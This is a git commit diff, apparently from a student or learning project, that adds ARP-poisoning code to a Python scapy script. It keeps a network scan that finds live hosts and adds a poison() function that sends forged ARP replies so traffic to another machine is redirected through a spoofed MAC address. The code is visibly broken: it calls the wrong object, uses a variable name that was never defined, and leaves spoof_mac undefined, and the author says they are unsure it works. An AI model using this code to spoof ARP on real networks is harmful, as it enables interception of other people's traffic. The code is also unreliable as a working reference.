b3114d17d388dcead45668d0eef140126cbf22d0
LvBaren <131879536+LvBaren@users.noreply.github.com>
2025-05-16 10:04:03 +0200

    Start of poisoning attack

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -3,16 +3,25 @@ from scapy.all import *;
 # This is the file for ARP poisoning. I'm not sure if it works or how to test it :)
 
 # First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
-# Scanning network for devices, ip is a range of ip adresses
+# Scanning network for devices, this returns (or is supposed to return) all live hosts.
 def network_scan(ip):
     arp = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     final_packet = broadcast / arp
-    # Note that sent is the ARP request I sent, received is the ARP reply, which has the IP and MAC information.
+    # Note that sent is the ARP request I sent, received is the ARP reply.
     packet_pairs = srp(packet, timeout=2, verbose=False)[0]
     hosts = []
     for sent, received in packet_pairs:
         hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
     return hosts
 
+# Here is where the main parts of the ARP poisoning is supposed to happen. 
+# 1. We need to be able to start the poisoning attack.
+# 2. We need to be able to get a current MAC adress. 
+# 3. we need to stop the attack in a proper way.
+
+# (1.) Start the poisoning attack by sending fake ARP replies.
+def poison(target_ip, poison_ip, target_mac):
+    fake_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poison_ip, hwsrc=spoof_mac)
+    send(fake_packet, verbose=False)
 
